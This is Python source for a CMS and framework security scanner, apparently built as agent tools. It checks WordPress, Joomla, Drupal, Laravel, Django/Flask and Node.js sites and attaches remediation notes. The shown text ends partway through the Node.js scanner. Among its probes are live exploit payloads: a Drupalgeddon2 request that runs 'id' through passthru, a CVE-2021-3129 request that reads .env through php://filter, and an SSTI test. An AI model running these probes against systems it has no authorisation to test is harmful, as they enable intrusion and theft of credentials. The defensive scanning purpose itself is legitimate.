"""
CF_AI — CMS and framework-specific security scanning tools.
Each function targets the unique attack surface of a specific platform.
Call profile_target() first, then dispatch to the relevant scan function.
"""
from __future__ import annotations
import re
import json
import subprocess
import urllib.parse
from sdk.agents import function_tool
from tools._http_explain import http_label

_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
_TO = 12


def _fetch(url: str, method: str = 'GET', data: str = '', follow: bool = True,
           extra_headers: list[str] | None = None) -> tuple[int, dict, str]:
    """Return (status, headers_lower, body). Empty tuple on error."""
    flags = ['-s', '-4', '--connect-timeout', '8', '--max-time', str(_TO),
             '-D', '-', '-A', _UA,
             '-H', 'Accept: text/html,application/xhtml+xml,*/*;q=0.8',
             '-H', 'Accept-Language: en-US,en;q=0.9']
    if follow:
        flags.append('-L')
    if method == 'POST':
        flags += ['-X', 'POST', '--data', data or '']
    if extra_headers:
        for h in extra_headers:
            flags += ['-H', h]
    flags.append(url)
    try:
        r = subprocess.run(['curl'] + flags, capture_output=True, text=True, timeout=_TO + 5)
        raw = r.stdout
    except Exception:
        return 0, {}, ''

    parts   = raw.split('\r\n\r\n', 1)
    hdr_raw = parts[0] if parts else ''
    body    = parts[1] if len(parts) > 1 else ''

    status = 0
    for line in hdr_raw.splitlines():
        m = re.match(r'HTTP/[\d.]+ (\d{3})', line)
        if m:
            status = int(m.group(1))

    headers: dict[str, str] = {}
    for line in hdr_raw.splitlines()[1:]:
        if ':' in line:
            k, _, v = line.partition(':')
            headers[k.strip().lower()] = v.strip()

    return status, headers, body


def _base(target: str) -> str:
    if not target.startswith('http'):
        target = 'https://' + target
    return target.rstrip('/')


def _clean(text: str) -> str:
    """Remove control characters from text."""
    import re as _re
    return _re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text).strip()


def _check_paths(base: str, paths: list[str]) -> list[dict]:
    """Probe a list of paths and return findings with human-readable status + preview."""
    findings = []
    for path in paths:
        url = base + path
        st, hdrs, body = _fetch(url)
        if st in (200, 301, 302, 403):
            preview = _clean(body[:500].replace('\n', ' ')) if body else ''
            findings.append({
                'path':    path,
                'url':     url,
                'status':  http_label(st),
                'preview': preview[:300],
            })
    return findings


# ──────────────────────────────────────────────────────────────────────────────
# WORDPRESS
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_wordpress(target: str, credentials: str = '') -> str:
    """
    Deep WordPress security scan.

    Checks: REST API user enumeration, xmlrpc.php, wp-config exposure,
    directory listing, debug.log, abandoned plugins, login page brute surface,
    wp-cron.php abuse, readme.html version leak, installed plugin/theme list.

    Args:
        target: Target URL (e.g. https://example.com)
        credentials: Optional 'username:password' for authenticated checks

    Returns JSON with findings, risk ratings, and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'cms': 'WordPress', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. Version leak via readme.html / license.txt
    for path in ['/readme.html', '/license.txt', '/wp-includes/version.php']:
        st, _, body = _fetch(base + path)
        if st == 200:
            ver = re.search(r'[Vv]ersion[:\s]+(\d+\.\d+[\.\d]*)', body)
            findings.append({
                'check': 'version_leak',
                'path': path,
                'status': http_label(st),
                'version': ver.group(1) if ver else 'unknown',
                'risk': 'medium',
                'detail': 'WordPress version exposed — allows targeted CVE lookup',
                'remediation': f'Remove or restrict {path}; keep WordPress updated'
            })

    # 2. REST API user enumeration (/wp-json/wp/v2/users)
    st, _, body = _fetch(base + '/wp-json/wp/v2/users')
    if st == 200:
        try:
            users = json.loads(body)
            usernames = [u.get('slug') or u.get('name') for u in users if isinstance(u, dict)]
            findings.append({
                'check': 'rest_user_enum',
                'path': '/wp-json/wp/v2/users',
                'status': http_label(st),
                'usernames': usernames[:10],
                'risk': 'high',
                'detail': f'REST API exposes {len(usernames)} usernames — enables targeted credential attacks',
                'remediation': 'Add to functions.php: add_filter("rest_endpoints", function($e){ unset($e["/wp/v2/users"]); return $e; });'
            })
        except Exception:
            pass

    # 3. ?author= redirect enumeration (author=1..5)
    for i in range(1, 6):
        st, hdrs, _ = _fetch(base + f'/?author={i}', follow=False)
        if st in (301, 302):
            loc = hdrs.get('location', '')
            m = re.search(r'/author/([^/]+)/', loc)
            if m:
                findings.append({
                    'check': 'author_enum',
                    'path': f'/?author={i}',
                    'status': http_label(st),
                    'username': m.group(1),
                    'risk': 'high',
                    'detail': f'Author ID {i} maps to username "{m.group(1)}"',
                    'remediation': 'Redirect author archives or remove login username from display name'
                })
                break

    # 4. xmlrpc.php enabled
    st, _, body = _fetch(base + '/xmlrpc.php', method='POST',
                         data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                         extra_headers=['Content-Type: text/xml'])
    if st == 200 and 'methodResponse' in body:
        findings.append({
            'check': 'xmlrpc_enabled',
            'path': '/xmlrpc.php',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'xmlrpc.php enabled — allows brute-force amplification (multicall) and SSRF',
            'remediation': 'Disable via nginx: location = /xmlrpc.php { deny all; } or use Wordfence'
        })

    # 5. wp-config.php / .bak exposure
    for path in ['/wp-config.php', '/wp-config.php.bak', '/wp-config.php~',
                 '/wp-config.bak', '/.wp-config.php.swp']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('DB_NAME' in body or 'DB_PASSWORD' in body or len(body) > 100):
            findings.append({
                'check': 'wp_config_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'critical',
                'detail': 'wp-config.php or backup exposed — contains DB credentials',
                'remediation': 'Move wp-config.php above web root; deny access in nginx/Apache'
            })

    # 6. debug.log exposure
    for path in ['/wp-content/debug.log', '/debug.log']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('PHP' in body or 'WordPress' in body or len(body) > 100):
            findings.append({
                'check': 'debug_log_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': 'WordPress debug log is publicly accessible — leaks paths and errors',
                'remediation': 'Set WP_DEBUG_LOG to false or move log outside web root'
            })

    # 7. Directory listing on uploads / plugins
    for path in ['/wp-content/uploads/', '/wp-content/plugins/', '/wp-content/themes/']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('Index of' in body or 'directory listing' in body.lower()):
            findings.append({
                'check': 'directory_listing',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': f'Directory listing enabled on {path}',
                'remediation': 'Add "Options -Indexes" in .htaccess or nginx autoindex off'
            })

    # 8. wp-cron.php publicly accessible (DoS amplification)
    st, _, body = _fetch(base + '/wp-cron.php')
    if st == 200:
        findings.append({
            'check': 'wp_cron_exposed',
            'path': '/wp-cron.php',
            'status': http_label(st),
            'risk': 'low',
            'detail': 'wp-cron.php publicly accessible — can be used for DoS amplification',
            'remediation': 'Disable via wp-config.php: define("DISABLE_WP_CRON", true); use real cron job'
        })

    # 9. Login page exposed (wp-login.php)
    st, _, body = _fetch(base + '/wp-login.php')
    if st == 200:
        findings.append({
            'check': 'login_exposed',
            'path': '/wp-login.php',
            'status': http_label(st),
            'risk': 'info',
            'detail': 'WordPress login page is publicly accessible — brute force target',
            'remediation': 'Add IP restriction or CAPTCHA; consider moving login URL with WPS Hide Login'
        })

    # 10. Common vulnerable plugin paths (passive check)
    vuln_plugin_paths = [
        '/wp-content/plugins/contact-form-7/',
        '/wp-content/plugins/woocommerce/',
        '/wp-content/plugins/elementor/',
        '/wp-content/plugins/yoast-seo/',
        '/wp-content/plugins/wordfence/',
        '/wp-content/plugins/wpforms-lite/',
        '/wp-content/plugins/akismet/',
        '/wp-content/plugins/jetpack/',
    ]
    detected_plugins = []
    for path in vuln_plugin_paths:
        st, _, _ = _fetch(base + path)
        if st in (200, 403):
            plugin = path.split('/')[-2]
            detected_plugins.append(plugin)
    if detected_plugins:
        findings.append({
            'check': 'detected_plugins',
            'plugins': detected_plugins,
            'risk': 'info',
            'detail': f'Detected {len(detected_plugins)} plugin directories — check each for known CVEs',
            'remediation': 'Keep all plugins updated; remove unused plugins; use WPScan for CVE correlation'
        })

    # Summary
    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run WPScan with --enumerate ap,at,u for full plugin/theme/user audit'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# JOOMLA
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_joomla(target: str) -> str:
    """
    Joomla security scan.

    Checks: administrator panel, configuration.php backup, version disclosure
    via README.txt / joomla.xml, debug mode, FTP config exposure, user
    registration abuse, REST API exposure, common Joomla CVE paths.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'cms': 'Joomla', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. Version disclosure
    version_paths = [
        '/administrator/manifests/files/joomla.xml',
        '/language/en-GB/en-GB.xml',
        '/README.txt',
    ]
    for path in version_paths:
        st, _, body = _fetch(base + path)
        if st == 200:
            ver = re.search(r'<version>([\d.]+)</version>', body) or \
                  re.search(r'Joomla![^\n]*?([\d]+\.[\d]+\.[\d]+)', body)
            findings.append({
                'check': 'version_disclosure',
                'path': path,
                'status': http_label(st),
                'version': ver.group(1) if ver else 'exposed',
                'risk': 'medium',
                'detail': 'Joomla version exposed via metadata file',
                'remediation': f'Deny access to {path} in nginx/Apache config'
            })
            break

    # 2. Administrator panel exposed
    st, _, body = _fetch(base + '/administrator/')
    if st == 200:
        findings.append({
            'check': 'admin_panel_exposed',
            'path': '/administrator/',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Joomla administrator login panel publicly accessible',
            'remediation': 'Restrict /administrator/ by IP or add 2FA plugin'
        })

    # 3. configuration.php backup files
    for path in ['/configuration.php.bak', '/configuration.php~',
                 '/configuration.php.save', '/configuration.bak']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('password' in body.lower() or 'db' in body.lower() or len(body) > 200):
            findings.append({
                'check': 'config_backup_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'critical',
                'detail': 'Joomla configuration backup file exposed — may contain DB credentials',
                'remediation': 'Remove backup files and restrict access to configuration.php'
            })

    # 4. Debug mode (CVE style — Joomla debug can leak info)
    st, _, body = _fetch(base + '/?option=com_users&view=login')
    if st == 200 and ('jdebug' in body.lower() or 'JDEBUG' in body):
        findings.append({
            'check': 'debug_mode',
            'path': '/?option=com_users&view=login',
            'risk': 'medium',
            'detail': 'Joomla debug mode appears to be enabled — leaks stack traces',
            'remediation': 'Set error_reporting = 0 and debug = 0 in configuration.php'
        })

    # 5. Joomla REST API (CVE-2023-23752 style — unauthenticated info leak)
    for path in ['/api/index.php/v1/config/application?public=true',
                 '/api/users', '/api/index.php/v1/users']:
        st, _, body = _fetch(base + path)
        if st == 200:
            try:
                data = json.loads(body)
                findings.append({
                    'check': 'rest_api_exposed',
                    'path': path,
                    'status': http_label(st),
                    'risk': 'critical',
                    'detail': 'Joomla REST API unauthenticated access — CVE-2023-23752 style info leak',
                    'snippet': body[:300],
                    'remediation': 'Upgrade Joomla to 4.2.8+; restrict API access or disable if unused'
                })
            except Exception:
                pass

    # 6. com_users registration open
    st, _, body = _fetch(base + '/index.php?option=com_users&view=registration')
    if st == 200 and ('registration' in body.lower() or 'username' in body.lower()):
        findings.append({
            'check': 'registration_open',
            'path': '/index.php?option=com_users&view=registration',
            'status': http_label(st),
            'risk': 'medium',
            'detail': 'User self-registration is open — potential spam/privilege escalation',
            'remediation': 'Disable registration in Joomla Global Configuration if not needed'
        })

    # 7. Common Joomla CVE paths
    cve_paths = [
        ('/plugins/system/debug/debug.php', 'Debug plugin path'),
        ('/cache/com_content/', 'Cache directory exposure'),
        ('/tmp/', 'Temp directory listing'),
        ('/logs/', 'Log directory — may expose error logs'),
    ]
    for path, detail in cve_paths:
        st, _, body = _fetch(base + path)
        if st == 200 and ('Index of' in body or len(body) > 200):
            findings.append({
                'check': 'sensitive_path',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': detail,
                'remediation': f'Block {path} in web server config'
            })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run JoomScan for comprehensive Joomla vulnerability assessment'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# DRUPAL
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_drupal(target: str) -> str:
    """
    Drupal security scan.

    Checks: Drupalgeddon2 (CVE-2018-7600), Drupalgeddon3 (CVE-2018-7602),
    version leak via CHANGELOG.txt, REST API exposure, admin panel,
    default install files, PHP filter module, update.php, user/1 enumeration.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and CVE references.
    """
    base     = _base(target)
    results  = {'target': base, 'cms': 'Drupal', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. Version via CHANGELOG.txt (Drupal 7) / core/CHANGELOG.txt (Drupal 8)
    for path in ['/CHANGELOG.txt', '/core/CHANGELOG.txt', '/INSTALL.txt',
                 '/core/INSTALL.txt', '/sites/default/default.settings.php']:
        st, _, body = _fetch(base + path)
        if st == 200:
            ver = re.search(r'Drupal\s+([\d.]+)', body)
            findings.append({
                'check': 'version_leak',
                'path': path,
                'status': http_label(st),
                'version': ver.group(1) if ver else 'exposed',
                'risk': 'medium',
                'detail': f'Drupal metadata file exposed — version disclosed via {path}',
                'remediation': f'Deny access to {path} in web server config'
            })

    # 2. Drupalgeddon2 probe (CVE-2018-7600) — check for Drupal 7 form API
    drpg_url = base + '/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup'
    st, _, body = _fetch(drpg_url)
    if st == 200 and ('uid=' in body or 'www-data' in body or 'root' in body):
        findings.append({
            'check': 'drupalgeddon2_rce',
            'cve': 'CVE-2018-7600',
            'path': drpg_url,
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'CRITICAL: Drupalgeddon2 RCE confirmed — unauthenticated remote code execution',
            'remediation': 'Upgrade to Drupal 7.58+ or Drupal 8.5.1+ IMMEDIATELY'
        })
    elif st in (200, 403):
        findings.append({
            'check': 'drupalgeddon2_probe',
            'cve': 'CVE-2018-7600',
            'status': http_label(st),
            'risk': 'info',
            'detail': 'Drupalgeddon2 probe path reached — could not confirm RCE (may be patched)',
            'remediation': 'Verify Drupal version is 7.58+ or 8.5.1+'
        })

    # 3. update.php exposed
    st, _, body = _fetch(base + '/update.php')
    if st == 200 and ('update' in body.lower() or 'drupal' in body.lower()):
        findings.append({
            'check': 'update_php_exposed',
            'path': '/update.php',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'update.php is publicly accessible — can trigger database updates',
            'remediation': 'Restrict access to update.php by IP or require admin authentication'
        })

    # 4. install.php exposed
    st, _, body = _fetch(base + '/install.php')
    if st == 200:
        findings.append({
            'check': 'install_php_exposed',
            'path': '/install.php',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'install.php is accessible — Drupal re-installation may be possible',
            'remediation': 'Block install.php in web server config after installation'
        })

    # 5. User enumeration (user/1)
    st, hdrs, body = _fetch(base + '/user/1', follow=False)
    if st in (301, 302):
        loc = hdrs.get('location', '')
        m = re.search(r'/users?/([^/?]+)', loc)
        if m:
            findings.append({
                'check': 'user_enum',
                'path': '/user/1',
                'status': http_label(st),
                'username': m.group(1),
                'risk': 'high',
                'detail': f'Admin username exposed via /user/1 redirect: "{m.group(1)}"',
                'remediation': 'Disable username display in profile; restrict user ID traversal'
            })

    # 6. Admin panel
    st, _, body = _fetch(base + '/admin/')
    if st == 200 and ('administer' in body.lower() or 'drupal' in body.lower()):
        findings.append({
            'check': 'admin_accessible',
            'path': '/admin/',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Drupal admin panel is accessible',
            'remediation': 'Ensure admin panel requires authentication; restrict by IP if possible'
        })

    # 7. REST API / JSON API endpoints (Drupal 8+)
    for path in ['/api/', '/?_format=json', '/node/?_format=json',
                 '/user/?_format=json', '/jsonapi/', '/jsonapi/user/user']:
        st, _, body = _fetch(base + path)
        if st == 200 and (body.strip().startswith('{') or body.strip().startswith('[')):
            try:
                data = json.loads(body)
                findings.append({
                    'check': 'rest_api_exposed',
                    'path': path,
                    'status': http_label(st),
                    'risk': 'medium',
                    'detail': 'Drupal JSON API accessible — may expose content/user data unauthenticated',
                    'remediation': 'Configure JSON API access control; disable if not needed'
                })
                break
            except Exception:
                pass

    # 8. sites/default/settings.php readable
    st, _, body = _fetch(base + '/sites/default/settings.php')
    if st == 200 and ('database' in body.lower() or 'password' in body.lower()):
        findings.append({
            'check': 'settings_php_exposed',
            'path': '/sites/default/settings.php',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'settings.php accessible — contains database credentials',
            'remediation': 'Set file permissions to 444; deny access in web server config'
        })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run droopescan or Drupalgeddon scanner for full CVE coverage'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# LARAVEL
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_laravel(target: str) -> str:
    """
    Laravel security scan.

    Checks: .env exposure (APP_KEY, DB_PASSWORD, etc.), debug mode (APP_DEBUG),
    CVE-2021-3129 RCE via Ignition debug endpoint, /telescope and /horizon
    admin panels, storage link traversal, PHPUnit RCE path, exposed log files,
    .git/config leak, APP_KEY for cookie forgery assessment.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings, severity ratings, and remediation steps.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'Laravel', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. .env file exposure (CRITICAL)
    for path in ['/.env', '/.env.backup', '/.env.local', '/.env.production',
                 '/.env.staging', '/.env.bak', '/public/.env']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('APP_' in body or 'DB_' in body or 'MAIL_' in body):
            keys_found = []
            for key in ['APP_KEY', 'APP_DEBUG', 'DB_PASSWORD', 'DB_USERNAME', 'DB_DATABASE',
                        'MAIL_PASSWORD', 'AWS_SECRET', 'STRIPE_SECRET', 'JWT_SECRET']:
                if key in body:
                    keys_found.append(key)
            findings.append({
                'check': 'env_exposed',
                'path': path,
                'status': http_label(st),
                'keys_found': keys_found,
                'risk': 'critical',
                'detail': f'.env file exposed — contains {len(keys_found)} sensitive keys: {", ".join(keys_found)}',
                'remediation': 'Move .env above web root; ensure public/ is the document root; deny .env in nginx'
            })

    # 2. Debug mode (APP_DEBUG=true → Ignition error page)
    st, _, body = _fetch(base + '/this-path-does-not-exist-cfai-probe-xyz')
    if st in (200, 500) and ('ignition' in body.lower() or 'Whoops' in body or
                              'APP_DEBUG' in body or 'laravel' in body.lower()):
        findings.append({
            'check': 'debug_mode_enabled',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Laravel debug mode (APP_DEBUG=true) is active — stack traces and env vars leaked on errors',
            'remediation': 'Set APP_DEBUG=false and APP_ENV=production in .env'
        })

    # 3. CVE-2021-3129 — Ignition RCE via /_ignition/execute-solution (Laravel < 8.4.3)
    ignition_url = base + '/_ignition/execute-solution'
    payload = json.dumps({
        'solution': 'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters': {'variableName': 'cf_probe', 'viewFile': 'php://filter/read=convert.base64-encode/resource=../../../.env'}
    })
    st, _, body = _fetch(ignition_url, method='POST', data=payload,
                         extra_headers=['Content-Type: application/json'])
    if st == 200 and ('solution' in body.lower() or body.strip().startswith('{')):
        try:
            resp = json.loads(body)
            if resp.get('wasSuccessful') or 'output' in resp:
                findings.append({
                    'check': 'cve_2021_3129_rce',
                    'cve': 'CVE-2021-3129',
                    'path': '/_ignition/execute-solution',
                    'status': http_label(st),
                    'risk': 'critical',
                    'detail': 'CRITICAL: Ignition RCE endpoint responds — CVE-2021-3129 may be exploitable',
                    'remediation': 'Upgrade to Laravel 8.4.3+; disable debug mode in production'
                })
        except Exception:
            pass

    # 4. /telescope — Laravel debug panel
    st, _, body = _fetch(base + '/telescope')
    if st == 200 and ('telescope' in body.lower() or 'Laravel Telescope' in body):
        findings.append({
            'check': 'telescope_exposed',
            'path': '/telescope',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Laravel Telescope debug panel is publicly accessible — exposes all requests, queries, and jobs',
            'remediation': 'Restrict Telescope to local environment or authenticated admins only'
        })

    # 5. /horizon — Laravel queue manager
    st, _, body = _fetch(base + '/horizon')
    if st == 200 and ('horizon' in body.lower() or 'Laravel Horizon' in body):
        findings.append({
            'check': 'horizon_exposed',
            'path': '/horizon',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Laravel Horizon queue dashboard is publicly accessible',
            'remediation': 'Restrict Horizon to authenticated admin users via HorizonServiceProvider::gate()'
        })

    # 6. Log file exposure
    for path in ['/storage/logs/laravel.log', '/storage/logs/error.log',
                 '/app/storage/logs/laravel.log']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('laravel' in body.lower() or 'exception' in body.lower() or
                           'production' in body.lower()):
            findings.append({
                'check': 'log_file_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': 'Laravel log file is publicly accessible — leaks stack traces, paths, and user data',
                'remediation': 'Ensure storage/ is not served by web server; document root should be public/'
            })
            break

    # 7. .git/config exposure
    st, _, body = _fetch(base + '/.git/config')
    if st == 200 and '[core]' in body:
        findings.append({
            'check': 'git_config_exposed',
            'path': '/.git/config',
            'status': http_label(st),
            'risk': 'high',
            'detail': '.git/config exposed — full source code may be downloadable via git dumping',
            'remediation': 'Block .git/ access in nginx; never deploy with .git directory in web root'
        })

    # 8. vendor/ directory accessible (PHPUnit RCE — CVE-2017-9841)
    st, _, body = _fetch(base + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
    if st == 200:
        findings.append({
            'check': 'phpunit_rce',
            'cve': 'CVE-2017-9841',
            'path': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'CRITICAL: PHPUnit eval-stdin.php accessible — CVE-2017-9841 RCE via POST',
            'remediation': 'Remove vendor/ from web root; document root must be public/ only'
        })

    # 9. /api/user endpoint (common unauthenticated exposure)
    st, _, body = _fetch(base + '/api/user')
    if st == 200 and ('"id"' in body or '"email"' in body or '"name"' in body):
        try:
            data = json.loads(body)
            findings.append({
                'check': 'api_user_exposed',
                'path': '/api/user',
                'status': http_label(st),
                'risk': 'high',
                'detail': 'Laravel /api/user returns user data without authentication',
                'remediation': 'Add auth:sanctum or auth:api middleware to protect /api/user route'
            })
        except Exception:
            pass

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Ensure APP_DEBUG=false, document root is public/, and run php artisan config:cache'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# DJANGO / FLASK
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_django_flask(target: str) -> str:
    """
    Django and Flask security scan.

    Checks: debug console (Django Werkzeug/interactive debugger), /admin/ panel,
    SSTI probes in common inputs, CSRF enforcement, DEBUG=True indicators,
    secret key strength hints, API endpoint enumeration, common misconfigs.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'Django/Flask', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. Django admin panel exposed
    for admin_path in ['/admin/', '/admin/login/', '/django-admin/']:
        st, _, body = _fetch(base + admin_path)
        if st == 200 and ('django' in body.lower() or 'administration' in body.lower() or
                           'csrfmiddlewaretoken' in body):
            findings.append({
                'check': 'django_admin_exposed',
                'path': admin_path,
                'status': http_label(st),
                'risk': 'high',
                'detail': 'Django admin panel is publicly accessible',
                'remediation': 'Change /admin/ URL in urls.py; restrict by IP; enforce 2FA'
            })
            break

    # 2. Debug mode / error page leak
    st, _, body = _fetch(base + '/cfai-probe-does-not-exist-xyz123')
    if st in (400, 404, 500):
        if 'django' in body.lower() and ('settings' in body.lower() or 'traceback' in body.lower()):
            findings.append({
                'check': 'django_debug_mode',
                'status': http_label(st),
                'risk': 'high',
                'detail': 'Django DEBUG=True — full tracebacks with local variables exposed',
                'remediation': 'Set DEBUG=False in production settings; configure ALLOWED_HOSTS'
            })
        elif 'werkzeug' in body.lower() or 'debugger' in body.lower():
            findings.append({
                'check': 'flask_debug_mode',
                'status': http_label(st),
                'risk': 'critical',
                'detail': 'Flask Werkzeug interactive debugger is active — allows arbitrary Python code execution',
                'remediation': 'Set app.run(debug=False) or FLASK_DEBUG=0 in production IMMEDIATELY'
            })

    # 3. Flask/Django Werkzeug debugger PIN bypass probe
    st, _, body = _fetch(base + '/console')
    if st == 200 and ('werkzeug' in body.lower() or 'console' in body.lower() or
                       'python' in body.lower()):
        findings.append({
            'check': 'werkzeug_console_exposed',
            'path': '/console',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'Werkzeug /console endpoint exposed — interactive Python shell',
            'remediation': 'Disable debug mode immediately; never expose Werkzeug debugger in production'
        })

    # 4. SSTI probe in URL path (basic — {{7*7}} encoded)
    ssti_probe = base + '/' + urllib.parse.quote('{{7*7}}')
    st, _, body = _fetch(ssti_probe)
    if st in (200, 500) and '49' in body:
        findings.append({
            'check': 'ssti_url_path',
            'path': '/' + '{{7*7}}',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'SSTI confirmed in URL path — template injection returns 49 for {{7*7}}',
            'remediation': 'Never render user input directly in templates; use Jinja2 sandbox; validate all inputs'
        })

    # 5. Common Django REST Framework / API endpoints
    for path in ['/api/', '/api/v1/', '/api/v2/', '/api/schema/', '/api/docs/']:
        st, _, body = _fetch(base + path)
        if st == 200:
            if 'browsable api' in body.lower() or 'django rest framework' in body.lower():
                findings.append({
                    'check': 'drf_browsable_api',
                    'path': path,
                    'status': http_label(st),
                    'risk': 'medium',
                    'detail': 'Django REST Framework browsable API is enabled in production',
                    'remediation': 'Set DEFAULT_RENDERER_CLASSES to JSONRenderer only in production settings'
                })
                break
            elif body.strip().startswith('{') or body.strip().startswith('['):
                try:
                    json.loads(body)
                    findings.append({
                        'check': 'api_endpoint_exposed',
                        'path': path,
                        'status': http_label(st),
                        'risk': 'info',
                        'detail': 'API endpoint returns JSON without authentication',
                        'remediation': 'Verify this endpoint requires appropriate authentication'
                    })
                    break
                except Exception:
                    pass

    # 6. /metrics endpoint (Prometheus — leaks internal data)
    st, _, body = _fetch(base + '/metrics')
    if st == 200 and ('python_' in body or 'django_' in body or 'flask_' in body or
                       '# HELP' in body or '# TYPE' in body):
        findings.append({
            'check': 'metrics_exposed',
            'path': '/metrics',
            'status': http_label(st),
            'risk': 'medium',
            'detail': 'Prometheus /metrics endpoint is publicly accessible — leaks internal performance data',
            'remediation': 'Restrict /metrics to internal network or monitoring system IPs only'
        })

    # 7. Static files / MEDIA_ROOT misconfiguration
    for path in ['/media/', '/static/admin/', '/uploads/']:
        st, _, body = _fetch(base + path)
        if st == 200 and 'Index of' in body:
            findings.append({
                'check': 'directory_listing',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': f'Directory listing enabled on {path}',
                'remediation': 'Disable autoindex; serve static/media files via nginx with proper restrictions'
            })

    # 8. SECRET_KEY in JavaScript / page source (accidental exposure)
    st, _, body = _fetch(base + '/')
    if st == 200:
        sk_patterns = [r'SECRET_KEY\s*=\s*["\']([^"\']{20,})["\']',
                       r'secret_key["\']?\s*:\s*["\']([^"\']{20,})["\']']
        for pattern in sk_patterns:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                findings.append({
                    'check': 'secret_key_in_page',
                    'status': http_label(st),
                    'risk': 'critical',
                    'detail': 'SECRET_KEY found in page source — allows session forgery and CSRF bypass',
                    'remediation': 'Remove SECRET_KEY from all templates; load only from environment variables'
                })
                break

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run Django check --deploy; review DJANGO_SETTINGS_MODULE for production hardening'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# NODE.JS / EXPRESS
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_nodejs(target: str) -> str:
    """
    Node.js / Express security scan.

    Checks: package.json / package-lock.json exposure, JWT none-algorithm,
    prototype pollution probes, API endpoint enumeration, GraphQL introspection,
    debug endpoint exposure (/debug, /node_modules/), npm audit-style path checks,
    x-powered-by header, server-side template injection in common frameworks.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'Node.js/Express', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. package.json / package-lock.json exposure
    for path in ['/package.json', '/package-lock.json', '/npm-shrinkwrap.json',
                 '/yarn.lock', '/.npmrc']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('dependencies' in body or 'name' in body or 'version' in body):
            try:
                pkg = json.loads(body)
                name = pkg.get('name', 'unknown')
                version = pkg.get('version', 'unknown')
                deps = list(pkg.get('dependencies', {}).keys())[:10]
